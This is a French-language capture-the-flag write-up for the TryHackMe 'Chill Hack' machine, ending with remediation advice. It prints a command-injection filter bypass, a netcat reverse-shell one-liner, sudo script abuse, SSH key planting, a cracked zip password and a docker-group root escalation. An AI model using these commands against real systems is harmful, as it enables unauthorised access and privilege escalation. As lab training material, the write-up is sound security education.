---
title: "Chill Hack - Writeup"
date: 2026-03-02
categorie: [TryHackMe, CTF]
tags: [FTP, Reverse Shell, Sudo, SUID]
difficulty: Easy
---

## Objectif
L'objectif de cette machine est d'obtenir un accès initial au système, de récupérer le flag utilisateur, puis d'élever ses privilèges afin de devenir `root` et lire le flag final.


## Configuration

Commençons par ajouter l’adresse ip de la machine cible dans le fichier `/etc/hosts`

```bash
echo "<machine_ip>  chillhack.thm" >> /etc/hosts
```

## Ennumération

Détectons les ports ouverts via un scan `nmap`

```bash
nmap -sC -sV chillhack.thm
```

On a le résultat suivant

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Ports ouverts:

- FTP(vsftpd 3.0.5) autorise les connexions anonymes
- Port SSH
- Port HTTP

Connectons nous au service FTP pour voir si il s’y cache des fichiers intéressants

```bash
ftp chillhack.thm

```

```bash
Connected to chillhack.thm.
220 (vsFTPd 3.0.5)
Name (chillhack.thm:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62775|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||45679|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |********************|    90        1.38 MiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.65 KiB/s)
ftp> exit
221 Goodbye.
```

Lisons le fichier note récupéré

Anurodh told me that there is some filtering on stringsbeing put in the command -- Apaar

Intéressant! Le système utilise un système pour trier les commandes mais qui ne fonctionne pas très bien

Enumérons les dossiers cachés via `gobuster`

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://chillhack.thm 
```

```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://chillhack.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://chillhack.thm/css/]
/fonts                (Status: 301) [Size: 314] [--> http://chillhack.thm/fonts/]
/images               (Status: 301) [Size: 315] [--> http://chillhack.thm/images/]
/index.html           (Status: 200) [Size: 35184]
/js                   (Status: 301) [Size: 311] [--> http://chillhack.thm/js/]
/secret               (Status: 301) [Size: 315] [--> http://chillhack.thm/secret/]
/server-status        (Status: 403) [Size: 278]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

On a un dossier caché très interessant : `secret`

## Premiers Pas sur le site

On se rend à l’adresse `http://chillhack.thm/secret` 

![image.png](attachment:886dd5f8-55af-4cc3-8a5a-9f5b0dfc18f5:image.png)

Dans le champ command on peut y insérer des commandes mais aucune ne marches. Quand on utilise des commandes systèmes on obtient une page Are you a hacker ? 

![image.png](attachment:12032e38-5743-4631-9b38-701f0c4d07aa:image.png)

Rappellons nous que la note nous disais que le filtre ne marche pas très bien. Un peut donc essayer de lister le répertoire courant en contournant le filtre

```bash
l${abc}s
```

On utilise la variable d’environnement ${abc}. Etant donné qu’elle n’existe pas le système le remplace par une chaine vide et la commande `ls` s’exécute donc 

![image.png](attachment:1a7b30b6-2d40-4f98-ae04-42b491153ce5:image.png)

**Pourquoi ça marche ?** 

> Dans un shell Linux , `${abc`} est une variable d’environnement. Si elle n’existe pas elle est remplacée par une chaine vide donc `l${abc}`  deviens `ls`. Ainsi la vulnérabilité vient du filtrage basé sur une blacklist. Le système filtre la chaine “ls” mais pas ses expensions.
> 

On peut donc exploiter cette vulnérabilité pour obtenir un reverse shell. Sur notre machine hôte on exécute

```bash
nc -lvnp 9001
```

Et dans le champ commande on tape

```bash
r${abc}m /tmp/f;m${abc}kfifo /tmp/f;c${abc}at /tmp/f|/bin/bash -i 2>&1|n${abc}c <our_ip> 9001 >/tmp/f
```

## Capture User Flag

Il nous faut maintenant déterminer nos privilèges actuels et comment en obtenir davantage. Commençons par une commande simple pour vérifier si www-data est autorisé à exécuter des commandes sudo :

```bash
sudo -l
```

Le résultat est très prometteur

```bash
Matching Defaults entries for www-data on ip-10-113-182-71:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-113-182-71:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

Il semble que nous puissions exécuter `/home/apaar/.helpline.sh` en tant qu'utilisateur `apaar`. Vérifions le contenu de ce fichier :

```bash
cat /home/apaar/.helpline.sh
```

Le résultat est le suivant

```bash
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

Ce script nous demande le nom d’une personne à qui parler et un message. La vulnérabilité ce situe dans le fait que le message est exécuter sur le système. On peut donc obtenir un shell en lançant le script en tant qu’utilisateur apaar et en exécutant juste `bash` c’est à dire en entrant bash dans le champ message.

**Pourquoi c’est vulnérable ?** 

> `$msg` est interprété comme une commande. Le shell exécute son contenu sans validation
> 

```bash
sudo -u apaar /home/apaar/.helpline.sh
```

```bash
www-data@ip-10-113-182-71:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: test
Hello user! I am test,  Please enter your message: bash
```

On obtient ainsi un shell à stabiliser

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Une fois le shell stabilisé on peut récupérer le flag user

```bash
apaar@ip-10-113-182-71:/var/www/html/secret$ ls /home
anurodh  apaar  aurick  ubuntu
apaar@ip-10-113-182-71:/var/www/html/secret$ ls /home/apaar
local.txt
apaar@ip-10-113-182-71:/var/www/html/secret$ cat /home/apaar/local.txt 
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
apaar@ip-10-113-182-71:/var/www/html/secret$ 
```

**Flag User** : {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

## Capture Rot flag

```bash
apaar@ip-10-113-182-71:/var/www/html/secret$ ss -tulnp
Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
udp   UNCONN 0      0      10.113.182.71%eth0:68           0.0.0.0:*            
tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN 0      511             127.0.0.1:9001         0.0.0.0:*            
tcp   LISTEN 0      511                     *:80                 *:*            
tcp   LISTEN 0      128                  [::]:22              [::]:*            
tcp   LISTEN 0      32                      *:21                 *:*            
```

En listant les services tournant sur la machine on tombe sur un tournant sur le port `9001` suspect. Etant donné qu’on n’a pas accès à un navigateur pour pouvoir voir le service on va utiliser la redirection de port `SSH`. Mais nous n’avons pas le mot de passe de l’user apaar nous allons générer une paire de clé et copier la notre dans le fichier `authorized_keys` pour pouvoir se connecter sans mots de passes.

```bash
ssh-keygen -t rsa -b 4096 -f ./id_rsa.pub
```

Ensuite on lis le contenu du fichier `id_rsa` qu’on copie et sur le serveur on exécute

```bash
cat >> /home/apaar/.ssh/authorized_keys
```

Ensuite on copie le contenue de la clé puis on fait un `Ctrl+C`

Sur notre machine on peut exécuter

```bash
ssh -L 9001:localhost:9001 apaar@chillhack.thm -i id_rsa
```

Ensuite dans notre navigateur on peut se rendre sur `http://localhost:9001` . On tombe sur un portail de connexion

![image.png](attachment:3248227f-a706-42b5-89b3-38e4a72fbca5:image.png)

On peut essayer de lister les dossiers chachés

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://localhost:9001
```

On a le résultat

```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:9001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 314] [--> http://localhost:9001/images/]
/index.php            (Status: 200) [Size: 572]
/server-status        (Status: 200) [Size: 8600]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

Il y a un dossier image et on peut télécharger l’image du hackeur et extrire ses métadonnées avec `steghide`

```bash
wget http://localhost:9001/images/hacker-with-laptop_23-2147985341.jpg
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

Steghide extrait un fichier `backup.zip` mais en essayer de le dezipper via `unzip` un mot de passe nous est demander. On peut craquer ce mot de passe avec john

```bash
zip2john backup.zip > zip.hash
john zip.hash
```

John arrive à craquer le code qui est `pass1word` . On peut donc exécuter

```bash
unzip backup.zip
Password: pass1word
```

Le zip contient le fichier `source_code.php` dont le contenu est : 

```bash
<html>
<head>
	Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
			Email: <input type="email" name="email" placeholder="email"><br><br>
			Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
		</form>
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
</html>

```

Ce script php vérifie si l’encodage en base64 du mot de passe est IWQwbnRLbjB3bVlwQHNzdzByZA== et affiche Welcome Anurodh! en cas de connexion réussie. On a donc récupéré:

- Username : anurodh
- Password: !d0ntKn0wmYp@ssw0rd (décodé avec Cyberchef)

On peut donc sur la machine cible avec ces identifiants

```bash
su anurodh
Password: !d0ntKn0wmYp@ssw0rd
```

On exécutant la commande `id` on remarque qu’il appartient au groupe `999(docker)` qui laisse présager une escalade de privilège par docker. On peut donc exécuter le payload adapté à cette situation

```bash
docker run -v /:/mnt -it alpine chroot /mnt
```

On obtient un accès root. On peut donc lire le flag root

```bash
root@4f17b165bd5e:/# ls /root
proof.txt  snap
root@4f17b165bd5e:/# cat /root/proof.txt 

					{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

Congratulations! You have successfully completed the challenge.

         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  

--------------------------------------------Designed By -------------------------------------------------------
					|  Anurodh Acharya |
					---------------------

	               		     Let me know if you liked it.

Twitter
	- @acharya_anurodh
Linkedin
	- www.linkedin.com/in/anurodh-acharya-b1937116a
```

**Root Flag** : {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

Pourquoi ça marche ? 

> Les membres du groupe docker peuvent lancer des conteneurs et le `deamon docker` tourne en root. L’option `-v /:/mnt` monte le système hôte dans le conteneur et `chroot /mnt` change la racine vers le système réel.
> 

## Recommendations

- FTP Anonyme
    - Désactiver l’accès anonyme
    - Restreindre l’accès aux fichiers sensibles
    - Désactiver le services si il n’est pas vraiment nécéssaire
- Command Injection Web
    - Ne jamais exécuter directement une entrée utilisateur
    - Eviter l’appel au shell si inutile
    - Utiliser des whitelist bien plus sûrs que des blacklist
- Escalade de privilèges
    - Supprimer tous les scripts non utile
    - Limiter les droits des utilisateurs strictement à ceux dont ils ont besoin
    - Supprimer les utilisateurs non root du groupe docker